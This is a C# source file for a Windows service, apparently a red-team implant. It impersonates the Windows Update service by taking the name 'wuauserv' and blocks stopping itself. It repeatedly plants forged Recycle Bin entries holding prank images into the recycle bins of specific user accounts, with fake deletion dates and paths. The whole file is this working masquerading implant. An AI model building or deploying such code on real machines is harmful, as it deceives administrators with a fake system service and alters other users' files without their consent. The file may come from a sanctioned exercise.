using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace wuauserv
{
    public partial class Service1 : ServiceBase
    {
        public bool IsRunning = false;
        private Thread LoopThread;

        private int LoopDelay = 120000;

        public Service1()
        {
            InitializeComponent();
            this.ServiceName = "wuauserv";
            this.CanStop = false;
        }


        protected override void OnStart(string[] args)
        {
            // Create thread with loop function
            LoopThread = new Thread(Loop);

            // Run thread
            IsRunning = true;
            LoopThread.Start();
        }

        protected override void OnStop()
        {
            IsRunning = false;
        }

        private string[] Files =
        {
            "hmmMMMMMMMMMMMMMMMMMMMMMMMMMM.png",
            "keep-calm-the-red-team-is-here.png",
            "limfaow.png",
            "oarnge.jpg",
            "rainbownotdynamix.png",
            "ripcyantho.jpg",
            "sus.png",
            "usedto.png",
            "Z.png"
        };
        private void Loop()
        {
            // Loop until stopped
            while (IsRunning)
            {
                RecyclingBin();
                Thread.Sleep(LoopDelay);
            }
        }
        

        private void RecyclingBin()
        {
            try
            {
                int count = TraverseTree("C:\\$Recycle.Bin\\");
                if (count != 0) return;
                string[] Directories = Directory.GetDirectories("C:\\$Recycle.Bin\\");
                Directories = FindMatchesInArray(Directories, "S-1-5-21-1020382062-1274705207-1189945501-10[0-9]{2}");
                foreach (string dir in Directories)
                {
                    for (int i = 0; i < RandomNumber(0, 15); i++)
                    {
                        string file = Files[RandomNumber(0, 8)];
                        byte[] content = GetData(file);
                        RecycleEntry entry = new RecycleEntry($"C:\\Workshop\\{RandomNumber(500, 10000)}_{file}", content, 132318324000000000);
                        entry.SaveTo(dir);
                    }
                }
            }
            catch { }
        }
        private string[] FindMatchesInArray(string[] array, string regex)
        {
            try
            {
                List<string> stringsList = new List<string>();
                foreach (string s in array)
                {
                    if (Regex.IsMatch(s, regex))
                        stringsList.Add(s);
                }
                return stringsList.ToArray();

            }
            catch { return null; }
        }
        internal class RecycleEntry
        {
            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            private struct RecycleIMeta
            {
                public long Prefix;
                public long FileSize;
                public long DateDeleted;
                public int PathSize;
            }
            public byte[] RData { private set; get; }
            public byte[] IData { private set; get; }
            private string Extension;
            public RecycleEntry(string fileName, byte[] fileContents, long DateDeleted = 132318324000000000)
            {
                try
                {
                    RData = fileContents;
                    List<byte> iDataFinal = new List<byte>();
                    iDataFinal.AddRange(
                    ToByteArray(new RecycleIMeta()
                    {
                        Prefix = 2L,
                        FileSize = fileContents.Length,
                        DateDeleted = DateDeleted,
                        PathSize = fileName.Length + 1
                    }));
                    foreach (byte b in Encoding.ASCII.GetBytes(fileName)) iDataFinal.AddRange(BitConverter.GetBytes((short)b));
                    iDataFinal.AddRange(new byte[2]);
                    IData = iDataFinal.ToArray();
                    if (fileName.IndexOf('.') < 0) Extension = "";
                    else Extension = fileName.Substring(fileName.LastIndexOf('.'));

                }
                catch { }
            }

            public void SaveTo(string path)
            {
                Random r = new Random();
                try
                {
                    string newPath;
                    while (File.Exists(Path.Combine(path, "$I" + (newPath = new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", 6).Select(s => s[r.Next(s.Length)]).ToArray()) + Extension)))) ;
                    File.WriteAllBytes(Path.Combine(path, "$I" + newPath), IData);
                    File.WriteAllBytes(Path.Combine(path, "$R" + newPath), RData);
                }
                catch { }
            }

            private byte[] ToByteArray<T>(T s) where T : struct
            {
                try
                {
                    int size = Marshal.SizeOf(s);
                    byte[] data = new byte[size];
                    IntPtr dwStruct = Marshal.AllocHGlobal(size);
                    Marshal.StructureToPtr(s, dwStruct, true);
                    Marshal.Copy(dwStruct, data, 0, size);
                    Marshal.FreeHGlobal(dwStruct);
                    return data;

                }
                catch { return null; }
            }
        }
        private static byte[] GetData(string res)
        {
            try
            {
                var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream($"wuauserv.{res}");
                if (stream == null) return null;
                using (BinaryReader r = new BinaryReader(stream))
                {
                    byte[] data = new byte[stream.Length];
                    r.Read(data, 0, data.Length);
                    return data;
                }

            }
            catch { return null; }
        }
        public static int TraverseTree(string root)
        {
            try
            {
                int fileCount = 0;
                // Data structure to hold names of subfolders to be
                // examined for files.
                Stack<string> dirs = new Stack<string>(20);

                if (!System.IO.Directory.Exists(root))
                {
                    throw new ArgumentException();
                }
                dirs.Push(root);

                while (dirs.Count > 0)
                {
                    string currentDir = dirs.Pop();
                    string[] subDirs;
                    try
                    {
                        subDirs = System.IO.Directory.GetDirectories(currentDir);
                    }
                    // An UnauthorizedAccessException exception will be thrown if we do not have
                    // discovery permission on a folder or file. It may or may not be acceptable
                    // to ignore the exception and continue enumerating the remaining files and
                    // folders. It is also possible (but unlikely) that a DirectoryNotFound exception
                    // will be raised. This will happen if currentDir has been deleted by
                    // another application or thread after our call to Directory.Exists. The
                    // choice of which exceptions to catch depends entirely on the specific task
                    // you are intending to perform and also on how much you know with certainty
                    // about the systems on which this code will run.
                    catch (UnauthorizedAccessException e)
                    {
                        continue;
                    }
                    catch (System.IO.DirectoryNotFoundException e)
                    {
                        continue;
                    }

                    string[] files = null;
                    try
                    {
                        files = System.IO.Directory.GetFiles(currentDir);
                    }

                    catch (UnauthorizedAccessException e)
                    {
                        continue;
                    }

                    catch (System.IO.DirectoryNotFoundException e)
                    {
                        continue;
                    }
                    // Perform the required action on each file here.
                    // Modify this block to perform your required task.
                    foreach (string file in files)
                    {
                        try
                        {
                            // Perform whatever action is required in your scenario.
                            System.IO.FileInfo fi = new System.IO.FileInfo(file);
                            if (fi.Name != "desktop.ini" && Regex.IsMatch(fi.FullName, "S-1-5-21-.*-10[0-9]{2}") && !fi.FullName.Contains("S-1-5-21-1020382062-1274705207-1189945501-1011") && !fi.FullName.Contains("$I"))
                            {
                                fileCount++;
                            }
                        }
                        catch (System.IO.FileNotFoundException e)
                        {
                            // If file was deleted by a separate application
                            //  or thread since the call to TraverseTree()
                            // then just continue.
                            continue;
                        }
                    }

                    // Push the subdirectories onto the stack for traversal.
                    // This could also be done before handing the files.
                    foreach (string str in subDirs)
                        dirs.Push(str);
                }
                return fileCount;

            }
            catch { return 1; }
        }
        // Instantiate random number generator.  
        private readonly Random _random = new Random();

        // Generates a random number within a range.      
        private int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }
    }
}
